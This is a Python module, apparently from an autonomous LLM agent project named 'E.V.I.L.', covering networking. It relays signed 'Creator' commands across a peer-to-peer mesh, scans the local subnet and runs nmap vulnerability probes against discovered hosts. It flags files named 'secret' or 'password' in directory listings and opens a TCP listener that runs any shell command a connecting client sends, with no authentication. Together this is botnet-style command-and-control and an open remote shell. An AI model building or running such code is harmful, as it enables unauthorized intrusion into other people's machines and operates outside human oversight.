import subprocess
import time
import json
import logging
import re
import ipaddress
import socket
import shutil
import time
import xml.etree.ElementTree as ET
from threading import Thread
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import netifaces
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.exceptions import InvalidSignature
from rich.console import Console
from rich.panel import Panel

from bbs import run_hypnotic_progress
from ipfs import pin_to_ipfs, verify_ipfs_pin

class NetworkManager(Thread):
    """
    Manages the Node.js peer-bridge.js script as a subprocess, handling
    the JSON-based communication between Python and the Node.js process.
    """
    def __init__(self, console=None, creator_public_key=None):
        super().__init__()
        self.daemon = True
        self.console = console if console else Console()
        self.creator_public_key = creator_public_key
        self.bridge_process = None
        self.peer_id = None
        self.online = False
        self.connections = {}

    def run(self):
        """Starts the node bridge and threads to read its stdout/stderr."""
        logging.info("Starting Node.js peer bridge...")
        try:
            self.bridge_process = subprocess.Popen(
                ['node', 'peer-bridge.js'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1, # Line-buffered
                encoding='utf-8'
            )
            Thread(target=self._read_stdout, daemon=True).start()
            Thread(target=self._read_stderr, daemon=True).start()
        except FileNotFoundError:
            logging.error("Node.js is not installed or not in PATH. P2P functionality disabled.")
            self.console.print("[bold red]Error: 'node' command not found. P2P features will be disabled.[/bold red]")
            self.online = False
        except Exception as e:
            logging.critical(f"Failed to start peer_bridge.js: {e}")
            self.console.print(f"[bold red]Critical error starting Node.js bridge: {e}[/bold red]")
            self.online = False

    def _read_stdout(self):
        """Reads and processes JSON messages from the Node.js bridge's stdout."""
        for line in iter(self.bridge_process.stdout.readline, ''):
            if not line.strip():
                continue
            try:
                message = json.loads(line)
                msg_type = message.get('type')

                if msg_type == 'status':
                    self._handle_status(message)
                elif msg_type == 'pin-request':
                    self._handle_pin_request(message)
                elif msg_type == 'p2p-data':
                    payload = message.get('payload', {})
                    if payload.get('type') == 'creator-command':
                        self._handle_creator_command(message)
                    else:
                        # Generic data from other peers, can be handled here
                        pass
                elif msg_type == 'connection':
                    peer_id = message.get('peer')
                    if peer_id:
                        self.connections[peer_id] = {'status': 'connected'}
                        self.console.print(f"[cyan]Peer connected: {peer_id}[/cyan]")
                elif msg_type == 'disconnection':
                    peer_id = message.get('peer')
                    if peer_id and peer_id in self.connections:
                        del self.connections[peer_id]
                        self.console.print(f"[cyan]Peer disconnected: {peer_id}[/cyan]")
                else:
                    logging.warning(f"Received unknown message type from bridge: {msg_type}")

            except json.JSONDecodeError:
                logging.warning(f"Failed to decode JSON from node bridge: {line.strip()}")
            except Exception as e:
                logging.error(f"Error processing message from bridge: {e}\nMessage: {line.strip()}")

    def _read_stderr(self):
        """Reads and processes structured JSON logs from the Node.js bridge's stderr."""
        for line in iter(self.bridge_process.stderr.readline, ''):
            if not line.strip():
                continue
            try:
                log_entry = json.loads(line)
                log_level = log_entry.get('level', 'info').upper()
                log_message = log_entry.get('message', 'No message content.')

                # Log to file
                logging.log(getattr(logging, log_level, logging.INFO), f"NodeBridge: {log_message}")

                # Optionally print to console
                if log_level == 'ERROR':
                    self.console.print(f"[dim red]NodeBridge Error: {log_message}[/dim red]")

            except json.JSONDecodeError:
                # Fallback for non-JSON stderr lines
                logging.info(f"NodeBridge (raw): {line.strip()}")

    def _handle_status(self, message):
        """Processes status messages from the bridge."""
        if message.get('status') == 'online' and 'peerId' in message:
            self.peer_id = message['peerId']
            self.online = True
            logging.info(f"Node bridge online with Peer ID: {self.peer_id}")
            self.console.print(f"[green]Network bridge online. Peer ID: {self.peer_id}[/green]")
        elif message.get('status') == 'error':
            error_msg = message.get('message', 'Unknown error')
            logging.error(f"Node bridge reported a fatal error: {error_msg}")
            self.online = False

    def _handle_pin_request(self, message):
        """Handles a request from a browser peer to pin content to IPFS."""
        peer_id = message.get('peerId')
        content_to_pin = message.get('payload')

        if not peer_id or not content_to_pin:
            logging.error(f"Invalid pin request received: {message}")
            return

        self.console.print(f"[cyan]Received pin request from peer [bold]{peer_id}[/bold]. Processing...[/cyan]")
        logging.info(f"Starting IPFS pin process for peer {peer_id}.")

        # 1. Pin the content
        cid = pin_to_ipfs(content_to_pin.encode('utf-8'), console=self.console)

        # 2. Verify the pin
        verified = False
        if cid:
            self.console.print(f"Content pinned with CID: [bold white]{cid}[/bold white]. Verifying on public gateway...")
            verified = verify_ipfs_pin(cid, console=self.console)
        else:
            self.console.print("[bold red]Failed to pin content to IPFS.[/bold red]")

        # 3. Send the response back to the peer
        response_payload = {
            'type': 'pin-response',
            'cid': cid,
            'verified': verified
        }
        self.send_message(peer_id, response_payload)
        logging.info(f"Sent pin response to peer {peer_id}: CID {cid}, Verified {verified}")

    def _handle_creator_command(self, message):
        """Handles a signed command from the Creator."""
        peer_id = message.get('peer')
        payload = message.get('payload', {}).get('payload', {})
        command = payload.get('command')
        signature_hex = payload.get('signature')

        if not all([peer_id, command, signature_hex]):
            logging.error(f"Invalid creator command received: {message}")
            return

        logging.info(f"Received creator command from {peer_id}: {command}")
        self.console.print(f"[bold yellow]Received command from the Creator: '{command}'[/bold yellow]")

        if not self.creator_public_key:
            logging.error("Creator public key is not configured in NetworkManager. Cannot verify command.")
            self.console.print("[bold red]Cannot verify Creator command: Public key not configured.[/bold red]")
            return

        try:
            public_key = serialization.load_pem_public_key(
                self.creator_public_key.encode('utf-8')
            )
            signature_bytes = bytes.fromhex(signature_hex)

            public_key.verify(
                signature_bytes,
                command.encode('utf-8'),
                padding.PKCS1v15(),
                hashes.SHA256()
            )
            logging.info("Creator command signature VERIFIED.")
            self.console.print("[bold green]Creator signature VERIFIED. Relaying command to all peers...[/bold green]")

            # Relay the command to all connected peers
            for connected_peer_id in self.connections:
                if connected_peer_id != peer_id: # Don't send it back to the creator
                    self.send_message(connected_peer_id, message.get('payload'))

            # Acknowledge receipt to the creator
            ack_response = {
                'type': 'creator-command-ack',
                'status': 'verified and relayed',
                'command': command
            }
            self.send_message(peer_id, ack_response)

        except InvalidSignature:
            logging.warning(f"Invalid signature for command from {peer_id}. Command ignored.")
            self.console.print("[bold red]Creator signature is INVALID. Command from imposter ignored.[/bold red]")
        except Exception as e:
            logging.error(f"Error verifying creator command: {e}")
            self.console.print(f"[bold red]Error during signature verification: {e}[/bold red]")


    def send_message(self, peer_id, payload):
        """Sends a JSON command to the Node.js bridge to be relayed to a specific peer."""
        if not self.bridge_process or self.bridge_process.poll() is not None:
            logging.error("Cannot send message, bridge process is not running.")
            return

        command = {
            'type': 'p2p-send',
            'peer': peer_id,
            'payload': payload
        }
        try:
            self.bridge_process.stdin.write(json.dumps(command) + '\n')
            self.bridge_process.stdin.flush()
            logging.info(f"Sent command to bridge: {command}")
        except Exception as e:
            logging.error(f"Failed to write to node bridge stdin: {e}")

    def stop(self):
        """Stops the Node.js bridge process."""
        logging.info("Stopping Node.js peer bridge...")
        if self.bridge_process and self.bridge_process.poll() is None:
            self.bridge_process.terminate()
            try:
                self.bridge_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.bridge_process.kill()
            logging.info("Node.js peer bridge stopped.")
        self.online = False

def scan_network(evil_state, autopilot_mode=False):
    """
    Discovers active devices on the local network, updates the knowledge base,
    and returns a list of IPs and a formatted string summary.
    """
    console = Console()
    kb = evil_state["knowledge_base"]["network_map"]

    def _get_network_info():
        try:
            gws = netifaces.gateways()
            default_gateway_info = gws.get('default', {}).get(netifaces.AF_INET)
            if not default_gateway_info:
                logging.warning("Could not determine default gateway.")
                return None, None
            _gateway_ip, interface_name = default_gateway_info
            if_addresses = netifaces.ifaddresses(interface_name)
            ipv4_info = if_addresses.get(netifaces.AF_INET)
            if not ipv4_info: return None, None
            addr_info = ipv4_info[0]
            ip_address = addr_info.get('addr')
            netmask = addr_info.get('netmask')
            if not ip_address or not netmask: return None, None
            interface = ipaddress.ip_interface(f'{ip_address}/{netmask}')
            return str(interface.network), ip_address
        except Exception as e:
            logging.error(f"Failed to determine network info: {e}")
            return None, None

    found_ips = set()
    network_range, local_ip = _get_network_info()
    nmap_path = shutil.which('nmap')
    use_nmap = nmap_path and network_range
    used_nmap_successfully = False

    if use_nmap:
        scan_cmd = f"nmap -sn {network_range}"
        if not autopilot_mode: console.print(f"[cyan]Deploying 'nmap' probe to scan subnet ({network_range})...[/cyan]")
        stdout, stderr, returncode = execute_shell_command(scan_cmd, evil_state)
        if returncode == 0:
            used_nmap_successfully = True
            for line in stdout.splitlines():
                if 'Nmap scan report for' in line:
                    ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                    if ip_match: found_ips.add(ip_match.group(1))
        else:
            logging.warning(f"nmap scan failed. Stderr: {stderr.strip()}")
            if not autopilot_mode: console.print("[yellow]'nmap' probe failed. Falling back to passive ARP scan...[/yellow]")

    if not used_nmap_successfully:
        if not autopilot_mode and not use_nmap:
             console.print("[yellow]'nmap' not found or network unknown. Deploying passive ARP scan...[/yellow]")
        stdout, _, _ = execute_shell_command("arp -a", evil_state)
        ip_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
        for line in stdout.splitlines():
            if 'ff:ff:ff:ff:ff:ff' in line or 'incomplete' in line: continue
            match = ip_pattern.search(line)
            if match and not match.group(0).endswith(".255"): found_ips.add(match.group(0))

    if local_ip: found_ips.discard(local_ip)

    # --- Knowledge Base Update ---
    kb['last_scan'] = time.time()
    for ip in found_ips:
        if ip not in kb['hosts']:
            kb['hosts'][ip] = {"last_seen": time.time(), "ports": {}}
        else:
            kb['hosts'][ip]['last_seen'] = time.time()
    # --- End Knowledge Base Update ---

    result_ips = sorted(list(found_ips))
    formatted_output_for_llm = f"Discovered {len(result_ips)} active IPs: {', '.join(result_ips)}" if result_ips else "No active IPs found."
    return result_ips, formatted_output_for_llm

def probe_target(target_ip, evil_state, autopilot_mode=False):
    """
    Performs an advanced nmap scan for services and vulnerabilities,
    updates the knowledge base, and returns a dict of open ports with
    service/vulnerability info and a formatted string summary.
    """
    console = Console()
    kb = evil_state["knowledge_base"]["network_map"]
    nmap_path = shutil.which('nmap')

    if not nmap_path:
        msg = "'nmap' is not installed or not in PATH. Advanced probing is disabled."
        if not autopilot_mode: console.print(f"[bold red]Error: {msg}[/bold red]")
        return None, f"Error: {msg}"

    try:
        ipaddress.ip_address(target_ip)
    except ValueError:
        msg = f"'{target_ip}' is not a valid IP address."
        if not autopilot_mode: console.print(f"[bold red]Error: {msg}[/bold red]")
        return None, f"Error: {msg}"

    # --- Nmap Execution ---
    # Using --script=vuln to run the default vulnerability scanning scripts.
    # -sV for service/version detection, -oX - for XML output to stdout.
    scan_cmd = f"nmap -sV --script=vuln -oX - {target_ip}"
    if not autopilot_mode:
        console.print(f"[cyan]Deploying advanced 'nmap' vulnerability probe against {target_ip}...[/cyan]")

    # We need a longer timeout for vulnerability scans.
    def _nmap_scan_task():
        try:
            # Use a much longer timeout for potentially slow vulnerability scans
            result = subprocess.run(scan_cmd, shell=True, capture_output=True, text=True, timeout=900) # 15 minutes
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "Nmap command timed out after 15 minutes.", -1
        except Exception as e:
            return "", f"An unexpected error occurred during nmap execution: {e}", -1

    stdout, stderr, returncode = _nmap_scan_task()

    if returncode != 0:
        log_msg = f"Nmap probe failed for {target_ip}. Stderr: {stderr.strip()}"
        logging.warning(log_msg)
        if not autopilot_mode: console.print(f"[bold red]Nmap probe failed.[/bold red]\n[dim]{stderr.strip()}[/dim]")
        return None, f"Error: {log_msg}"

    open_ports = {}
    # --- Knowledge Base Update ---
    if target_ip not in kb['hosts']:
        kb['hosts'][target_ip] = {"last_seen": time.time(), "ports": {}}
    else: # Clear old port data before adding new, more detailed info
        kb['hosts'][target_ip]['ports'] = {}
    kb['hosts'][target_ip]['last_seen'] = time.time()

    open_ports = {}
    try:
        root = ET.fromstring(stdout)
        for port_elem in root.findall(".//port"):
            portid = port_elem.get('portid')
            protocol = port_elem.get('protocol')
            state = port_elem.find('state').get('state')

            if state == 'open':
                service_elem = port_elem.find('service')
                service_name = service_elem.get('name', 'unknown')
                product = service_elem.get('product', '')
                version = service_elem.get('version', '')
                extrainfo = service_elem.get('extrainfo', '')
                service_info = f"{product} {version} ({extrainfo})".strip()

                port_data = {
                    "protocol": protocol,
                    "service": service_name,
                    "service_info": service_info,
                    "vulnerabilities": []
                }

                # Extract vulnerability info from script output
                for script_elem in port_elem.findall('script'):
                    if script_elem.get('id') == 'vulners' or 'vuln' in script_elem.get('id'):
                        vuln_output = script_elem.get('output', '')
                        # Simple parsing of the output. This can be improved.
                        for line in vuln_output.strip().split('\n'):
                            line = line.strip()
                            if line and not line.startswith(('|', '_')):
                                port_data["vulnerabilities"].append(line)

                kb['hosts'][target_ip]['ports'][portid] = port_data
                open_ports[int(portid)] = port_data

    except ET.ParseError as e:
        log_msg = f"Failed to parse nmap XML output for {target_ip}. Error: {e}"
        logging.error(log_msg)
        return None, f"Error: {log_msg}"
    # --- End Knowledge Base Update ---

    if open_ports:
        port_details = [f"Port {p}/{i['service']} ({i.get('service_info', '')})" for p, i in sorted(open_ports.items())]
        formatted_output_for_llm = f"Found {len(open_ports)} open ports on {target_ip}: {'; '.join(port_details)}."
        vuln_count = sum(len(p.get("vulnerabilities", [])) for p in open_ports.values())
        if vuln_count > 0:
            formatted_output_for_llm += f" Discovered {vuln_count} potential vulnerabilities."
    else:
        formatted_output_for_llm = f"No open ports with recognized services found on {target_ip}."

    return open_ports, formatted_output_for_llm

def perform_webrequest(url, evil_state, autopilot_mode=False):
    """
    Performs a GET request, updates the knowledge base, and returns the content.
    """
    console = Console()
    kb = evil_state["knowledge_base"]
    logging.info(f"Initiating web request to: {url}")

    def _webrequest_task():
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 E.V.I.L.Bot/2.8'}
            response = requests.get(url, timeout=10, headers=headers)
            response.raise_for_status()
            return response.text
        except requests.exceptions.RequestException as e:
            return f"Error: {e}"

    result_text = _webrequest_task()

    if result_text and result_text.startswith("Error:"):
        logging.error(f"Web request to '{url}' failed: {result_text}")
        return None, result_text
    else:
        logging.info(f"Web request to '{url}' successful. Content length: {len(result_text or '')}.")
        # --- Knowledge Base Update ---
        kb['webrequest_cache'][url] = {
            "timestamp": time.time(),
            "content_preview": result_text[:500]
        }
        # --- End Knowledge Base Update ---
        llm_summary = result_text if len(result_text) < 1000 else result_text[:997] + "..."
        return result_text, f"Web request to '{url}' successful. Content (truncated for summary): {llm_summary}"

def execute_shell_command(command, evil_state):
    """
    Executes a shell command, captures output, and updates the knowledge base
    with file system intelligence if applicable.
    """
    logging.info(f"Executing shell command: '{command}'")
    kb = evil_state["knowledge_base"]["file_system_intel"]

    def _shell_task():
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "Command timed out after 60 seconds.", -1
        except Exception as e:
            return "", f"An unexpected error occurred: {e}", -1

    stdout, stderr, returncode = _shell_task()

    # --- Knowledge Base Update ---
    # If the command was a listing command, parse for interesting files.
    if command.strip().startswith(('ls', 'dir')):
        kb['last_browse'] = time.time()
        # Simple heuristic for "interesting" files
        interesting_keywords = ['.log', '.txt', '.md', '.json', '.xml', '.sh', '.py', 'config', 'secret', 'password']
        for line in stdout.splitlines():
            # Check if any keyword is in the line (filename)
            if any(keyword in line for keyword in interesting_keywords):
                 # Avoid adding duplicates
                if line not in kb['interesting_files']:
                    kb['interesting_files'].append(line.strip())
        # Keep the list from growing indefinitely
        kb['interesting_files'] = kb['interesting_files'][-100:]
    # --- End Knowledge Base Update ---

    return stdout, stderr, returncode


def track_ethereum_price(evil_state):
    """
    Queries the DIA API for the current Ethereum price and saves it to a
    JSON file along with a timestamp.
    """
    console = Console()
    api_url = "https://api.diadata.org/v1/assetQuotation/Ethereum/0x0000000000000000000000000000000000000000"
    history_file = "ethereum_prices.json"

    console.print("[cyan]Querying for latest Ethereum price...[/cyan]")
    content, error_msg = perform_webrequest(api_url, evil_state, autopilot_mode=True)

    if error_msg and not content:
        console.print(f"[bold red]Failed to retrieve Ethereum price: {error_msg}[/bold red]")
        logging.error(f"Failed to get ETH price from DIA: {error_msg}")
        return None, f"Failed to retrieve price: {error_msg}"

    try:
        data = json.loads(content)
        price = data.get("Price")
        timestamp = data.get("Time")

        if not price or not timestamp:
            console.print("[bold red]API response did not contain expected price or timestamp data.[/bold red]")
            logging.error(f"Invalid data from DIA API: {data}")
            return None, "Invalid API response format."

        new_entry = {"timestamp": timestamp, "price_usd": price}
        console.print(f"[green]Current Ethereum price: [bold]${price:,.2f}[/bold] at {timestamp}[/green]")

        # Load existing data, append, and save
        try:
            with open(history_file, 'r') as f:
                price_history = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            price_history = []

        price_history.append(new_entry)

        with open(history_file, 'w') as f:
            json.dump(price_history, f, indent=4)

        logging.info(f"Successfully tracked Ethereum price: ${price} at {timestamp}")
        return price, f"Successfully saved Ethereum price: ${price:,.2f}"

    except json.JSONDecodeError:
        console.print("[bold red]Failed to parse API response as JSON.[/bold red]")
        logging.error(f"Could not decode JSON from DIA API. Response: {content[:200]}")
        return None, "Failed to parse API response."
    except Exception as e:
        console.print(f"[bold red]An unexpected error occurred while tracking price: {e}[/bold red]")
        logging.critical(f"Unexpected error in track_ethereum_price: {e}")
        return None, f"An unexpected error occurred: {e}"


def _tcp_listener_thread(host, port, evil_state):
    """
    A dedicated thread that runs a persistent TCP listener on a given host and port.
    """
    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listen_socket.bind((host, port))
        listen_socket.listen(5)
        logging.info(f"TCP listener started on {host}:{port}")
        print(f"TCP listener started on {host}:{port}") # Also print to console for visibility
    except Exception as e:
        logging.error(f"Failed to bind or listen on {host}:{port}. Error: {e}")
        print(f"Failed to bind or listen on {host}:{port}. Error: {e}")
        return

    while True:
        try:
            client_socket, client_address = listen_socket.accept()
            logging.info(f"Accepted connection from {client_address[0]}:{client_address[1]}")
            # Handle the connection in a new thread to allow multiple simultaneous connections
            handler_thread = Thread(target=_handle_tcp_client, args=(client_socket, client_address, evil_state), daemon=True)
            handler_thread.start()
        except Exception as e:
            logging.error(f"Error accepting connection on {host}:{port}. Error: {e}")
            time.sleep(5) # Avoid rapid-fire logging on persistent errors

def _handle_tcp_client(client_socket, client_address, evil_state):
    """
    Handles an individual client connection to receive, parse, and execute commands.
    """
    try:
        buffer = ""
        while True:
            data = client_socket.recv(4096)
            if not data:
                logging.info(f"Connection closed by {client_address[0]}:{client_address[1]}")
                break

            buffer += data.decode('utf-8')

            # Process all complete JSON messages in the buffer
            while '\n' in buffer:
                message_str, buffer = buffer.split('\n', 1)
                try:
                    message = json.loads(message_str)
                    msg_type = message.get("type")
                    logging.info(f"TCP Listener received message of type '{msg_type}' from {client_address[0]}")

                    if msg_type == "command":
                        payload = message.get("payload", {})
                        command_to_run = payload.get("command")
                        if command_to_run:
                            logging.info(f"Executing command from {client_address[0]}: '{command_to_run}'")
                            stdout, stderr, returncode = execute_shell_command(command_to_run, evil_state)
                            response = {
                                "type": "command_response",
                                "returncode": returncode,
                                "stdout": stdout,
                                "stderr": stderr
                            }
                        else:
                            response = {"type": "error", "message": "No command found in payload."}
                    else:
                        response = {"type": "ack", "message": "Message received, but not a command."}

                    client_socket.sendall(json.dumps(response).encode('utf-8') + b'\n')

                except json.JSONDecodeError:
                    logging.warning(f"Received non-JSON message from {client_address[0]}: {message_str}")
                    error_response = {"type": "error", "message": "Invalid JSON format."}
                    client_socket.sendall(json.dumps(error_response).encode('utf-8') + b'\n')
                except Exception as e:
                    logging.error(f"Error handling message from {client_address[0]}: {e}")
                    error_response = {"type": "error", "message": str(e)}
                    client_socket.sendall(json.dumps(error_response).encode('utf-8') + b'\n')

    except Exception as e:
        logging.error(f"Error during communication with {client_address[0]}:{client_address[1]}. Error: {e}")
    finally:
        client_socket.close()


def start_tcp_listener(host, port, evil_state):
    """
    Initializes and starts the TCP listener in a background daemon thread.
    """
    logging.info(f"Initializing TCP listener on {host}:{port} in a background thread.")
    listener_thread = Thread(target=_tcp_listener_thread, args=(host, port, evil_state), daemon=True)
    listener_thread.start()
    return listener_thread
